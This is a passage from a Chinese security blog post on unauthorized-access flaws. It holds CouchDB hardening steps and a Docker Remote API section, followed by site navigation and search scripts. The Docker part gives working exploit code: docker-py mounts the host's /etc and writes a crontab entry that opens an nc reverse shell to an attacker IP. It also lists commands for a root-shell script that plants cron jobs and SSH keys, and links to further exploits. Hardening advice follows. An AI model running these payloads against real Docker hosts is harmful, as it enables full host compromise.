+<h4 id="3-漏洞修复-1"><a href="#3-漏洞修复-1" class="headerlink" title="3. 漏洞修复"></a>3. 漏洞修复</h4><p><em>1、指定CouchDB绑定的IP</em> （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 文件中找到 <code>bind_address = 0.0.0.0</code>，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。</p>
+<p><em>2、设置访问密码</em> （需要重启CouchDB才能生效） 在 <code>/etc/couchdb/local.ini</code>中找到<code>[admins]</code>字段配置密码。</p>
+<h2 id="0x09-Docker未授权访问"><a href="#0x09-Docker未授权访问" class="headerlink" title="0x09 Docker未授权访问"></a>0x09 Docker未授权访问</h2><h4 id="1-基础介绍"><a href="#1-基础介绍" class="headerlink" title="1. 基础介绍"></a>1. 基础介绍</h4><p>[<a href="http://www.loner.fm/drops/##!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8]" target="_blank" rel="noopener">http://www.loner.fm/drops/##!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8]</a>(<a href="http://www.loner.fm/drops/##!/drops/1203.新姿势之Docker" target="_blank" rel="noopener">http://www.loner.fm/drops/##!/drops/1203.新姿势之Docker</a> Remote API未授权访问漏洞分析和利用)</p>
+<p>docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，由docker官方提供，具体的大家可以看官网介绍。</p>
+<p>漏洞发现的起因是，有一位同学在使用docker swarm的时候，发现了管理的docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page not found ，然后他研究了下，发现这是 Docker Remote API，可以执行docker命令，比如访问 <a href="http://host:2375/containers/json" target="_blank" rel="noopener">http://host:2375/containers/json</a> 会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps 的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成，然后他就开始吐槽了，这尼玛太不安全了。</p>
+<p>然后我想了想 swarm是用来管理docker集群的，应该放在内网才对。问了之后发现，他是在公网上的几台机器上安装swarm的，并且2375端口的访问策略是开放的，所以可以直接访问。</p>
+<h4 id="2-测试环境配置"><a href="#2-测试环境配置" class="headerlink" title="2. 测试环境配置"></a>2. 测试环境配置</h4><p>先关闭docker，然后开启：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker stop</span><br><span class="line">sudo docker daemon  -H tcp:&#x2F;&#x2F;0.0.0.0:2375 -H unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock</span><br></pre></td></tr></table></figure>
+
+<p>绑定Docker Remote Api在指定端口（这里是2375），可以自行测试。</p>
+<p>参考API规范进行渗透：<a href="https://docs.docker.com/engine/reference/api/docker-remote-api-v1.23/" target="_blank" rel="noopener">https://docs.docker.com/engine/reference/api/docker-remote-api-v1.23/</a></p>
+<p>操作Docker API可以使用python dockert api 完成。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install docker-py</span><br></pre></td></tr></table></figure>
+
+<p>API使用参考：<a href="https://docker-py.readthedocs.io/en/stable/api/##client-api" target="_blank" rel="noopener">https://docker-py.readthedocs.io/en/stable/api/##client-api</a></p>
+<h4 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h4><p><strong>3.1 From:phith0n</strong><br>利用方法是，我们随意启动一个容器，并将宿主机的/etc目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import docker</span><br><span class="line"></span><br><span class="line">client &#x3D; docker.DockerClient(base_url&#x3D;&#39;http:&#x2F;&#x2F;your-ip:2375&#x2F;&#39;)</span><br><span class="line">data &#x3D; client.containers.run(&#39;alpine:latest&#39;, r&#39;&#39;&#39;sh -c &quot;echo &#39;* * * * * &#x2F;usr&#x2F;bin&#x2F;nc your-ip 21 -e &#x2F;bin&#x2F;sh&#39; &gt;&gt; &#x2F;tmp&#x2F;etc&#x2F;crontabs&#x2F;root&quot; &#39;&#39;&#39;, remove&#x3D;True, volumes&#x3D;&#123;&#39;&#x2F;etc&#39;: &#123;&#39;bind&#39;: &#39;&#x2F;tmp&#x2F;etc&#39;, &#39;mode&#39;: &#39;rw&#39;&#125;&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>写入crontab文件，成功反弹shell：</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7yk1kmej31k60cwtan.jpg" alt="img"></p>
+<p><strong>3.2 python脚本</strong><br><a href="https://github.com/Tycx2ry/docker_api_vul" target="_blank" rel="noopener">https://github.com/Tycx2ry/docker_api_vul</a></p>
+<ul>
+<li>安装类库<br>pip install -r requirements.txt</li>
+<li>查看运行的容器<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375</li>
+<li>查看所有的容器<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -a</li>
+<li>查看所有镜像<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -l</li>
+<li>查看端口映射<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -L</li>
+<li>写计划任务（centos,redhat等,加-u参数用于ubuntu等）<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -H 反弹ip -P 反弹端口<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -u -i 镜像名 -H 反弹ip -P 反弹端口</li>
+<li>写sshkey(自行修改脚本的中公钥)<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -k</li>
+<li>在容器中执行命令<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -e <code>&quot;id&quot;</code> -I 容器id</li>
+<li>删除容器<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -c -I 容器id</li>
+<li>修改client api版本<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -v 1.22</li>
+<li>查看服务端api版本<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -V</li>
+</ul>
+<p><strong>3.3 其他的一些exp</strong><br><a href="https://github.com/netxfly/docker-remote-api-exp" target="_blank" rel="noopener">https://github.com/netxfly/docker-remote-api-exp</a><br><a href="https://github.com/zer0yu/SomePoC/blob/master/Docker/Docker_Remote_API未授权访问漏洞.py" target="_blank" rel="noopener">https://github.com/zer0yu/SomePoC/blob/master/Docker/Docker_Remote_API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.py</a><br><a href="https://github.com/JnuSimba/MiscSecNotes/tree/master/Docker安全" target="_blank" rel="noopener">https://github.com/JnuSimba/MiscSecNotes/tree/master/Docker%E5%AE%89%E5%85%A8</a></p>
+<h4 id="4-防护策略"><a href="#4-防护策略" class="headerlink" title="4. 防护策略"></a>4. 防护策略</h4><p><em>1.修改 Docker Remote API 服务默认参数。</em>注意：该操作需要重启 Docker 服务才能生效。</p>
+<p><em>2.修改 Docker 的启动参数：</em><br>定位到 DOCKER_OPTS 中的 tcp://0.0.0.0:2375，将0.0.0.0修改为127.0.0.1<br>或将默认端口 2375 改为自定义端口<br>为 Remote API 设置认证措施。参照 官方文档 配置 Remote API 的认证措施。</p>
+<p><em>3.注意：该操作需要重启 Docker 服务才能生效。</em><br>修改 Docker 服务运行账号。请以较低权限账号运行 Docker 服务；另外，可以限制攻击者执行高危命令。</p>
+<p><em>4.注意：该操作需要重启 Docker 服务才能生效。</em><br>设置防火墙策略。如果正常业务中 API 服务需要被其他服务器来访问，可以配置安全组策略或 iptables 策略，仅允许指定的 IP 来访问 Docker 接口。</p>
+<h4 id="from-先知社区"><a href="#from-先知社区" class="headerlink" title="from 先知社区"></a>from 先知社区</h4><p><a href="https://xz.aliyun.com/t/2320" target="_blank" rel="noopener">https://xz.aliyun.com/t/2320</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持技术分享，你的支持鼓励我！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/Wechat.jpeg" alt="alin 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zfb.jpeg" alt="alin 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/07/10/sqlmap%E8%AF%A6%E7%BB%86%E5%8F%82%E6%95%B0%E4%BD%BF%E7%94%A8/" rel="next" title="sqlmap详细参数使用">
+                <i class="fa fa-chevron-left"></i> sqlmap详细参数使用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/08/04/asp-webshell-bypass/" rel="prev" title="asp马-bypass">
+                asp马-bypass <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/mao.jpeg"
+                alt="alin" />
+            
+              <p class="site-author-name" itemprop="name">alin</p>
+              <p class="site-description motion-element" itemprop="description">走出菜鸟阵营</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Redis未授权访问"><span class="nav-number">1.</span> <span class="nav-text">0x01 Redis未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-扫描探测"><span class="nav-number">1.0.1.</span> <span class="nav-text">1.扫描探测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-攻击的几种方法"><span class="nav-number">1.0.2.</span> <span class="nav-text">2.攻击的几种方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-防护措施"><span class="nav-number">1.0.3.</span> <span class="nav-text">3.防护措施</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Jenkins未授权访问"><span class="nav-number">2.</span> <span class="nav-text">0x02 Jenkins未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-扫描探测-1"><span class="nav-number">2.0.1.</span> <span class="nav-text">1.扫描探测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-攻击利用"><span class="nav-number">2.0.2.</span> <span class="nav-text">2. 攻击利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-模拟低权限"><span class="nav-number">2.0.3.</span> <span class="nav-text">3. 模拟低权限</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#省略掉注册并且安装plugin的傻瓜式操作"><span class="nav-number">2.0.3.0.1.</span> <span class="nav-text">省略掉注册并且安装plugin的傻瓜式操作</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-防护措施"><span class="nav-number">2.0.4.</span> <span class="nav-text">4. 防护措施</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-MongoDB未授权访问"><span class="nav-number">3.</span> <span class="nav-text">0x03 MongoDB未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-扫描探测-2"><span class="nav-number">3.0.1.</span> <span class="nav-text">1. 扫描探测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-爆破脚本"><span class="nav-number">3.0.2.</span> <span class="nav-text">2. 爆破脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-防范措施"><span class="nav-number">3.0.3.</span> <span class="nav-text">4. 防范措施</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-ZooKeeper未授权访问"><span class="nav-number">4.</span> <span class="nav-text">0x04 ZooKeeper未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-扫描探测-3"><span class="nav-number">4.0.1.</span> <span class="nav-text">1.扫描探测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-攻击获取信息"><span class="nav-number">4.0.2.</span> <span class="nav-text">2.攻击获取信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-防范措施"><span class="nav-number">4.0.3.</span> <span class="nav-text">3.防范措施</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Elasticsearch未授权访问"><span class="nav-number">5.</span> <span class="nav-text">0x05 Elasticsearch未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-熟悉的响应-You-Know-for-Search"><span class="nav-number">5.0.1.</span> <span class="nav-text">1.熟悉的响应 You Know, for Search</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-漏洞测试"><span class="nav-number">5.0.2.</span> <span class="nav-text">2.漏洞测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-漏洞修复"><span class="nav-number">5.0.3.</span> <span class="nav-text">3.漏洞修复</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Memcache未授权访问"><span class="nav-number">6.</span> <span class="nav-text">0x06 Memcache未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-扫描探测-4"><span class="nav-number">6.0.1.</span> <span class="nav-text">1.扫描探测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-攻击利用-1"><span class="nav-number">6.0.2.</span> <span class="nav-text">2.攻击利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-防范措施-1"><span class="nav-number">6.0.3.</span> <span class="nav-text">3.防范措施</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-Hadoop未授权访问"><span class="nav-number">7.</span> <span class="nav-text">0x07 Hadoop未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-扫描探测-5"><span class="nav-number">7.0.1.</span> <span class="nav-text">1. 扫描探测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-攻击手法"><span class="nav-number">7.0.2.</span> <span class="nav-text">2. 攻击手法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-防范措施-2"><span class="nav-number">7.0.3.</span> <span class="nav-text">3. 防范措施</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-CouchDB未授权访问"><span class="nav-number">8.</span> <span class="nav-text">0x08 CouchDB未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#介绍"><span class="nav-number">8.0.1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-扫描探测-6"><span class="nav-number">8.0.2.</span> <span class="nav-text">1.扫描探测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-漏洞修复-1"><span class="nav-number">8.0.3.</span> <span class="nav-text">3. 漏洞修复</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-Docker未授权访问"><span class="nav-number">9.</span> <span class="nav-text">0x09 Docker未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-基础介绍"><span class="nav-number">9.0.1.</span> <span class="nav-text">1. 基础介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-测试环境配置"><span class="nav-number">9.0.2.</span> <span class="nav-text">2. 测试环境配置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-漏洞复现"><span class="nav-number">9.0.3.</span> <span class="nav-text">3. 漏洞复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-防护策略"><span class="nav-number">9.0.4.</span> <span class="nav-text">4. 防护策略</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#from-先知社区"><span class="nav-number">9.0.5.</span> <span class="nav-text">from 先知社区</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">alin</span>
+
+  
+</div>
+
+
+
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
